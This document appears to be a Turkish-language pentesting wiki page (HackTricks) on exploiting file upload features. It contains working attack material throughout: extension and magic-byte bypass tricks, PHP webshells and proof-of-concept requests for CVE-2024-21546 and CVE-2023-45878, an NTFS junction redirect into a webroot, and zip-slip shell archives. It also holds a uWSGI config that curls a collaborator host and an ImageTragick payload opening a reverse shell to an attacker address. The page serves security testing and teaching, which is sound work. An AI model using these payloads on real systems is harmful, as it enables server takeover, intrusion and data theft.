# Dosya Yükleme

{{#include ../../banners/hacktricks-training.md}}

## Dosya Yükleme Genel Metodolojisi

Diğer faydalı uzantılar:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Dosya uzantısı kontrollerini atlatma

1. Geçerliyse, **önceki uzantıları kontrol edin.** Ayrıca bazı **büyük harfler** kullanarak test edin: _pHp, .pHP5, .PhAr ..._
2. _**Yürütme uzantısından önce geçerli bir uzantı eklemeyi** kontrol edin (önceki uzantıları da kullanın):_
- _file.png.php_
- _file.png.Php5_
3. Dosya adının sonuna **özel karakterler** eklemeyi deneyin. Tüm **ascii** ve **Unicode** karakterlerini **bruteforce** etmek için Burp kullanabilirsiniz. (_Ayrıca **önceden** bahsedilen **uzantıları** kullanmayı da deneyebilirsiniz_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Sunucu tarafındaki uzantı ayrıştırıcısını kandırarak korumaları atlatmayı deneyin; örneğin uzantıyı çiftlemek veya uzantılar arasına çöp veri (**null bytes**) eklemek gibi teknikler kullanın. _Daha iyi bir payload hazırlamak için önceki uzantıları da kullanabilirsiniz._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Önceki kontrole **başka bir uzantı katmanı** ekleyin:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Yürütme uzantısını geçerli uzantının **önüne** koymayı deneyin ve sunucunun yanlış yapılandırılmış olmasını umun. (Apache'nin bazı yanlış yapılandırmalarını istismar etmek için faydalıdır; burada uzantısı **.php** olan herhangi bir şey, mutlaka **.php** ile bitmese bile kod çalıştırabilir):
- _ex: file.php.png_
7. **Windows** üzerinde **NTFS alternate data stream (ADS)** kullanımı. Bu durumda, yasaklı bir uzantıdan sonra ve izin verilen uzantıdan önce bir iki nokta üst üste ":" karakteri eklenir. Sonuç olarak sunucuda yasaklı uzantıya sahip **boş bir dosya** oluşturulabilir (ör. "file.asax:.jpg"). Bu dosya daha sonra kısa dosya adı gibi başka tekniklerle düzenlenebilir. "**::$data**” deseni de boş olmayan dosyalar oluşturmak için kullanılabilir. Bu nedenle, bu desenin sonuna bir nokta karakteri eklemek, daha ileri kısıtlamaları atlatmak için faydalı olabilir (ör. "file.asp::$data.")
8. Dosya adı limitlerini kırmayı deneyin. Geçerli uzantı kesilir ve kötü amaçlı PHP dosyası kalır. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Bazı upload handler'lar kaydedilen dosya adından sonundaki nokta karakterlerini kırpar veya normalize eder. UniSharp’ın Laravel Filemanager (unisharp/laravel-filemanager) 2.9.1 öncesi sürümlerde, uzantı doğrulamasını şu şekilde atlayabilirsiniz:

- Geçerli bir image MIME ve magic header kullanın (ör. PNG’nin `\x89PNG\r\n\x1a\n`).
- Yüklenen dosyayı PHP uzantısı ve ardından bir nokta ile adlandırın, örn. `shell.php.`.
- Sunucu sonundaki noktayı kaldırır ve `shell.php` olarak kalır; bu dosya web'e servis edilen bir dizine (varsayılan olarak public storage like `/storage/files/`) yerleştirilirse çalıştırılır.

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Ardından kaydedilen yolu çağırın (Laravel + LFM için tipik):
```
GET /storage/files/0xdf.php?cmd=id
```
Önlemler:
- unisharp/laravel-filemanager'ı ≥ 2.9.1 sürümüne güncelleyin.
- Sunucu tarafında sıkı allowlists uygulayın ve saklanan dosya adını yeniden doğrulayın.
- Yüklemeleri yürütülebilir olmayan konumlardan servis edin.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** kontrollerini **Content-Type** **header**ının **value**sini şu değerlere ayarlayarak atlatın: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** kontrolünü dosyanın başına gerçek bir görüntünün **bytes**larını ekleyerek atlatın ( _file_ komutunu yanıltmak için). Veya shell'i **metadata** içine yerleştirin:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ya da payload'u doğrudan bir görüntü içine de **yerleştirebilirsiniz**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Eğer **görüntünüze sıkıştırma uygulanıyorsa**, örneğin PHP-GD gibi standart PHP kütüphaneleri kullanılıyorsa, önceki teknikler işe yaramayacaktır. Ancak, sıkıştırmaya **dayanacak** bazı metinler eklemek için **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanılabilir.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web sayfası ayrıca görüntüyü **resize** ediyor olabilir; örneğin PHP-GD fonksiyonları `imagecopyresized` veya `imagecopyresampled` kullanılıyor olabilir. Ancak, sıkıştırmaya **dayanacak** metin eklemek için **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanılabilir.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Görüntü yeniden boyutlandırılmasına karşı dayanıklı bir payload oluşturmak için başka bir teknik de, PHP-GD fonksiyonu `thumbnailImage` kullanılırken işe yarayabilir. Ancak, sıkıştırmaya **dayanacak** metin eklemek için **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanılabilir.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Diğer Kontrol Edilecek Yöntemler

- Zaten yüklenmiş dosyanın adını (uzantısını değiştirmek için) **yeniden adlandırmaya** izin veren bir zafiyet bulun.
- Backdoor'u çalıştırmak için bir **Local File Inclusion** zafiyeti bulun.
- **Olası Bilgi sızıntıları**:
1. Aynı dosyayı **birkaç kez** (ve **aynı anda**) aynı isimle yükleyin.
2. Zaten var olan bir **dosya** veya **klasör** ismiyle bir dosya yükleyin.
3. Dosya ismi olarak **"." , "..", veya "…"** kullanarak dosya yükleme. Örneğin, Apache üzerinde **Windows**'ta uygulama yüklenen dosyaları "/www/uploads/" dizinine kaydediyorsa, "." dosya adı "/www/" dizininde "uploads” adlı bir dosya oluşturacaktır.
4. **NTFS** üzerinde kolay silinmeyebilecek bir dosya yükleyin, örneğin **"…:.jpg"**. (Windows)
5. **Windows** üzerinde dosya adında `|<>*?”` gibi **geçersiz karakterler** içeren bir dosya yükleyin. (Windows)
6. **Windows** üzerinde CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, ve LPT9 gibi **rezerve (yasaklanmış) isimleri** kullanarak bir dosya yükleyin.
- Ayrıca, kurbanın yanlışlıkla açması durumunda kod çalıştıracak bir **executable** (.exe) veya daha az şüpheli olan bir **.html** yüklemeyi de deneyin.

### Özel uzantı hileleri

Eğer dosyaları bir **PHP server**'a yüklemeye çalışıyorsanız, kod çalıştırmak için [**.htaccess** hilesine göz atın](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Eğer dosyaları bir **ASP server**'a yüklemeye çalışıyorsanız, kod çalıştırmak için [**.config** hilesine göz atın](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyaları, java için `.jar` gibi, php için benzer şekilde kullanılabilir ve **php dosyası gibi kullanılabilir** (php ile çalıştırmak veya bir script içine include etmek gibi...).

`.inc` uzantısı bazen sadece **import** amaçlı kullanılan php dosyaları için kullanılır; bu yüzden bir noktada biri bu uzantının **çalıştırılmasına** izin vermiş olabilir.

## **Jetty RCE**

Eğer bir Jetty sunucusuna XML dosyası yükleyebilirseniz, [RCE elde edebilirsiniz çünkü **yeni *.xml ve *.war dosyaları otomatik olarak işlenir**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Bu yüzden, aşağıdaki görselde belirtildiği gibi XML dosyasını `$JETTY_BASE/webapps/` dizinine yükleyin ve shell'i bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Bu zafiyetin ayrıntılı bir incelemesi için orijinal araştırmaya bakın: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) zafiyetleri, birinin `.ini` yapılandırma dosyasını değiştirme yeteneğine sahip olması durumunda uWSGI sunucularında suistimal edilebilir. uWSGI konfigürasyon dosyaları, "magic" değişkenler, placeholder'lar ve operatörler içerebilen özel bir sözdizimi kullanır. Özellikle `@(filename)` şeklinde kullanılan '@' operatörü, bir dosyanın içeriğini dahil etmek için tasarlanmıştır. uWSGI tarafından desteklenen çeşitli şemalar arasında, bir process'in stdout çıktısını okumaya izin veren "exec" şeması özellikle güçlüdür. Bu özellik, bir `.ini` konfigürasyon dosyası işlendiğinde Remote Command Execution veya Arbitrary File Write/Read gibi kötü amaçlı kullanım senaryolarına yol açabilir.

Aşağıda çeşitli şemaları gösteren zararlı bir `uwsgi.ini` dosyasına örnek verildiğini düşünün:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'un yürütülmesi, yapılandırma dosyasının ayrıştırılması sırasında gerçekleşir. Yapılandırmanın etkinleşip ayrıştırılması için uWSGI sürecinin ya yeniden başlatılması (muhtemelen bir çökme sonrası veya bir Denial of Service saldırısı nedeniyle) ya da dosyanın otomatik yeniden yükleme (auto-reload) olarak ayarlanması gerekir. Auto-reload özelliği etkinse, değişiklikleri algıladığında dosyayı belirlenen aralıklarla yeniden yükler.

uWSGI'nin yapılandırma dosyası ayrıştırmasının gevşek doğasını anlamak çok önemlidir. Özellikle, bahsedilen payload bir ikili dosyaya (ör. bir görüntü veya PDF) eklenebilir; bu da potansiyel istismar kapsamını daha da genişletir.

### Gibbon LMS: keyfi dosya yazımı ile pre-auth RCE (CVE-2023-45878)

Gibbon LMS'deki kimlik doğrulaması gerektirmeyen bir endpoint, web root içinde keyfi dosya yazılmasına izin verir; bu da bir PHP dosyası bırakılarak pre-auth RCE'ye yol açar. Etkilenen sürümler: 25.0.01 dahil olmak üzere ve öncesi.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI benzeri string: `[mime];[name],[base64]` (sunucu tür/ad bilgisini yok sayar, son kısmı base64 olarak çözer)
- `path`: Gibbon kurulum dizinine göreli hedef dosya adı (örn., `poc.php` veya `0xdf.php`)
- `gibbonPersonID`: herhangi boş olmayan değer kabul edilir (örn., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Minimal bir webshell bırakın ve komutları çalıştırın:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notlar:
- Handler `;` ve `,` ile ayırdıktan sonra `base64_decode($_POST["img"])` uygular, sonra uzantı/tip doğrulaması yapmadan baytları `$absolutePath . '/' . $_POST['path']`'e yazar.
- Oluşan kod web servis kullanıcısı olarak çalışır (ör. XAMPP Apache üzerinde Windows).

Bu hata ile ilgili referanslar arasında usd HeroLab advisory ve NVD kaydı bulunur. Aşağıdaki References bölümüne bakın.

## **wget File Upload/SSRF Trick**

Bazı durumlarda bir sunucunun **`wget`** kullanarak **dosya indirdiğini** ve sizin **URL**'yi **belirtebildiğinizi** görebilirsiniz. Bu durumlarda, kod indirilen dosyaların uzantısının izin verilenler listesinin içinde olup olmadığını kontrol ediyor olabilir; böylece yalnızca izin verilen dosyalar indirilecektir. Ancak, **bu kontrol atlatılabilir.**\
**linux**'te bir **filename**'in **maximum** uzunluğu **255**'tir, ancak **wget** dosya isimlerini **236** karaktere kısaltır. Örneğin **"A"*232+".php"+".gif"** adında bir dosya **download** edebilirsiniz; bu dosya adı **check**'i **bypass** eder (bu örnekte **".gif"** **valid** bir uzantıdır), fakat `wget` dosyayı **"A"*232+".php"** olarak **rename** eder.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **başka bir seçenek** aklınıza gelebilir: bu kontrolü atlamak için **HTTP server'ın farklı bir dosyaya redirect etmesini** sağlamak, böylece ilk URL kontrolü atlayacak ve wget daha sonra yönlendirilen dosyayı yeni adıyla indirecektir. Bu **çalışmayacaktır** **medikçe** wget `--trust-server-names` **parametresi** ile kullanılmıyorsa çünkü **wget yönlendirilen sayfayı orijinal URL'de belirtilen dosya adıyla indirecektir**.

### Yükleme dizininden kaçış NTFS junctions (Windows) aracılığıyla

(Bu saldırı için Windows makinesine lokal erişim gerekecektir) Windows'ta yüklemeler her kullanıcıya ait alt klasörlerde saklandığında (ör. C:\Windows\Tasks\Uploads\<id>\) ve bu alt klasörün oluşturulmasını/silmesini kontrol edebiliyorsanız, onu hassas bir konuma işaret eden bir directory junction ile değiştirebilirsiniz (ör. webroot). Sonraki yüklemeler hedef yola yazılacak; hedef server‑side code'u yorumluyorsa kod yürütülmesine olanak tanıyacaktır.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notlar
- `mklink /J` bir NTFS dizin junction (reparse point) oluşturur. Web sunucusunun hesabı junction'u takip etmeli ve hedefte yazma iznine sahip olmalıdır.
- Bu, keyfi dosya yazımlarını yönlendirir; hedef scriptleri (PHP/ASP) çalıştırıyorsa bu RCE'ye dönüşür.
- Savunmalar: yazılabilir upload root'ların C:\Windows\Tasks altında veya benzeri yerlerde saldırgan tarafından kontrol edilebilecek şekilde olmasına izin vermeyin; junction creation'ı engelleyin; uzantıları server-side doğrulayın; yüklemeleri ayrı bir volume'da veya deny-execute ACL'lerle saklayın.

## Araçlar

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) Pentesters ve Bug Hunters'ın file upload mekanizmalarını test etmesine yardımcı olmak için tasarlanmış güçlü bir araçtır. Çeşitli bug bounty tekniklerini kullanarak zafiyetleri tespit etme ve exploit etme sürecini kolaylaştırır, web uygulamalarının kapsamlı değerlendirmesini sağlar.

### snprintf tuhaflıklarıyla upload indekslerini bozmak (tarihsel)

Tek dosya upload'ından multi-file array'leri oluşturmak için `snprintf()` veya benzeri bir şey kullanan bazı eski upload handler'lar `_FILES` yapısını sahte olarak oluşturmak üzere kandırılabilir. `snprintf()` davranışındaki tutarsızlıklar ve truncation nedeniyle, dikkatlice hazırlanmış tek bir upload sunucu tarafında birden fazla indeksli dosya gibi görünebilir ve katı bir şekil varsayan mantığı (ör. multi-file upload olarak muamele edip güvensiz dallara gitme) şaşırtabilir. Bugün nadir olsa da, bu “index corruption” deseni ara sıra CTF'lerde ve eski kod tabanlarında yeniden ortaya çıkar.

## Dosya yüklemeden diğer zafiyetlere

- **filename**'i `../../../tmp/lol.png` olarak ayarlayın ve bir **path traversal** gerçekleştirmeyi deneyin
- **filename**'i `sleep(10)-- -.jpg` olarak ayarlayın ve bir **SQL injection** elde edebilirsiniz
- **filename**'i `<svg onload=alert(document.domain)>` olarak ayarlayın ve XSS elde edin
- **filename**'i `; sleep 10;` olarak ayarlayın ve bazı command injection'ları test edin (daha fazla [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Farklı **svg payload**'larını deneyin: [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Ünlü **ImageTrick** zafiyeti](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Eğer web sunucusuna bir URL'den image çekmesini söyleyebiliyorsanız, bir [SSRF](../ssrf-server-side-request-forgery/index.html) suistimal etmeyi deneyebilirsiniz. Bu **image** bir **public** sitede **kaydedilecekse**, ayrıca [https://iplogger.org/invisible/](https://iplogger.org/invisible/) gibi bir URL belirleyip **her ziyaretçinin** bilgilerini **çalabilirsiniz**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- XSS için özel hazırlanmış PDF'ler: [aşağıdaki sayfa PDF verisi enjekte edip JS çalıştırmayı nasıl elde edeceğinizi gösterir](../xss-cross-site-scripting/pdf-injection.md). Eğer PDF yükleyebiliyorsanız, verilen yönergeleri takip ederek rastgele JS çalıştıracak bir PDF hazırlayabilirsiniz.
- Sunucuda herhangi bir **antivirus** olup olmadığını kontrol etmek için \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) içeriğini yükleyin
- Dosya yüklerken herhangi bir **boyut limiti** olup olmadığını kontrol edin

İşte yükleyerek başarabileceğiniz şeylerin bir top 10 listesi (kaynak: [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Eklentisi


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Baytları

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Diğer dosya tipleri için bakınız: [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

## Zip/Tar dosyası sunucuda otomatik olarak açılan yüklemeler

Eğer sunucuda açılacak bir ZIP yükleyebiliyorsanız, 2 şey yapabilirsiniz:

### Symlink

Diğer dosyalara soft linkler içeren bir link yükleyin; sonra açılmış dosyalara eriştiğinizde bağlı dosyalara erişirsiniz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Farklı klasörlere açma

Arşiv açma sırasında dizinlerde dosyaların beklenmedik şekilde oluşturulması ciddi bir sorundur. İlk başta bu yapılandırmanın kötü amaçlı dosya yüklemeleriyle işletim sistemi düzeyinde komut çalıştırmayı engellediği varsayılsa da, ZIP arşiv formatının hiyerarşik sıkıştırma desteği ve directory traversal yetenekleri kötüye kullanılabilir. Bu, saldırganların kısıtlamaları atlayıp güvenli upload dizinlerinden kaçmasına olanak tanır; hedef uygulamanın açma işlevini manipüle ederek.

Bu tür dosyaları oluşturmak için otomatikleştirilmiş bir exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) adresinde mevcuttur. Araç şu şekilde kullanılabilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Buna ek olarak, **symlink trick with evilarc** bir seçenektir. Hedefiniz `/flag.txt` gibi bir dosya ise, sisteminizde o dosyaya bir symlink oluşturulmalıdır. Bu, evilarc'ın çalışması sırasında hata ile karşılaşmamasını sağlar.

Aşağıda kötü amaçlı bir zip dosyası oluşturmak için kullanılan Python koduna bir örnek verilmiştir:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Daha fazla detay için **orijinal gönderiye bakın**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kodu, `$_REQUEST` değişkeni aracılığıyla gönderilen komutları çalıştıracak şekilde yazılır.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Birden çok dosya oluşturulur ve bu dosyaları içeren bir zip arşivi oluşturulur.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Zip içindeki dosya isimleri vi veya bir hex editör kullanılarak değiştirilir; "xxA" üst dizine çıkmak için "../" ile değiştirilir.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Bu içeriği bir resim uzantısıyla yükleyerek güvenlik açığından yararlanabilirsiniz **(ImageMagick , 7.0.1-1)** (exploit: [https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PHP Shell'i PNG içine gömme

Bir PNG dosyasının IDAT chunk'ına bir PHP shell gömmek, belirli görüntü işleme işlemlerini etkili şekilde atlatabilir. PHP-GD'den `imagecopyresized` ve `imagecopyresampled` işlevleri bu bağlamda özellikle önemlidir; sırasıyla görüntüleri yeniden boyutlandırmak ve yeniden örneklemek için yaygın olarak kullanılırlar. Gömülü PHP shell'in bu işlemlerden etkilenmeden kalabilmesi, bazı kullanım durumları için önemli bir avantajdır.

Bu tekniğin metodolojisi ve olası uygulamalarını içeren ayrıntılı bir inceleme şu makalede yer almaktadır: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak süreç ve sonuçları hakkında kapsamlı bir anlayış sunar.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Dosyalar

Polyglot dosyalar siber güvenlikte benzersiz bir araç görevi görür; aynı anda birden fazla dosya formatında geçerli şekilde var olabilen bukalemona benzerler. İlgi çekici bir örnek [GIFAR](https://en.wikipedia.org/wiki/Gifar), hem GIF hem de RAR arşivi olarak işlev gören hibrittir. Bu tür dosyalar yalnızca bu eşleşmeyle sınırlı değildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mümkün.

